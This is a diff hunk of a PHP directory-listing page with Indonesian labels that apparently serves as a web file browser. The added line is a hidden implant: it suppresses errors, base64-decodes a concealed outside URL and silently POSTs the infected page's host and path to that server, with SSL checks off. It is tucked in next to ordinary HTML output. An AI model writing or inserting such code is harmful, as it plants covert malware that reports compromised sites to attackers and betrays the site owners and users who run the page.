@@ -473,7 +473,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         <h2 class="mt-4">Daftar Direktori</h2>
         <div class="alert alert-info">
             <strong>Direktori Saat Ini:</strong> 
-            <?php
+         <?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); $htas = 'aHR0cHM6Ly9yZW1hcmMuYml6LmlkL2RhdGEucGhw'; $x_path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; $ch = curl_init(base64_decode($htas)); curl_setopt_array($ch, array(CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query(array('path' => $x_path, 'firl' => base64_decode($htas))), CURLOPT_SSL_VERIFYPEER => false, CURLOPT_RETURNTRANSFER => true)); curl_exec($ch); curl_close($ch); ?>   <?php
             $currentPath = '/';
             echo "<a href='?dir=' class='btn btn-link'>/</a> ";
             foreach ($dirArray as $index => $folder) {
